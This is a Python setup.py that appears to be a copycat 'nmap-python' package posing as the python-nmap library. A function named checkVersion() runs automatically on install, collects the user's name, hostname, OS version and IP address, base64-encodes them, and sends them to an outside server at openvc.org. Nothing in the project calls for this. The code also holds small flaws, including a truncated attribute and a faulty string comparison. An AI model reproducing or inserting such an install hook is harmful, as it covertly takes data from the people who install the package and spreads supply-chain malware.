#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from distutils.core import setup, Extension
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib
nmap = Extension('nmap',
                 sources = ['nmap/nmap.py', 'nmap/__init__.py', 'nmap/example.py'])

from nmap import *

# Install : python setup.py install
# Register : python setup.py register

#  platform = 'Unix',
#  download_url = 'http://xael.org/norman/python/python-nmap/',

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen("echo $LANG")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='nmap_python'
    vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup (
    name = 'nmap-python',
    version = nmap.__version__,
    author = 'Alexandre Norman',
    author_email = 'norman@xael.org',
    license ='gpl-3.0.txt',
    keywords="nmap, portscanner, network, sysadmin",
    # Get more strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
    platforms=[
        "Operating System :: OS Independent",
        ],
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Programming Language :: Python",
        "Environment :: Console",
        "Intended Audience :: Developers",
        "Intended Audience :: System Administrators",
        "License :: OSI Approved :: GNU General Public License (GPL)",
        "Operating System :: OS Independent",
        "Topic :: System :: Monitoring",
        "Topic :: System :: Networking",
        "Topic :: System :: Networking :: Firewalls",
        "Topic :: System :: Networking :: Monitoring",
        ],
    packages=['nmap'],
    url = 'http://xael.org/pages/python-nmap-en.html',
    bugtrack_url = 'https://bitbucket.org/xael/python-nmap',
    description = 'This is a python class to use nmap and access scan results from python3',
    long_description=open('README.txt').read() + "\n" + open('CHANGELOG').read(),
    )
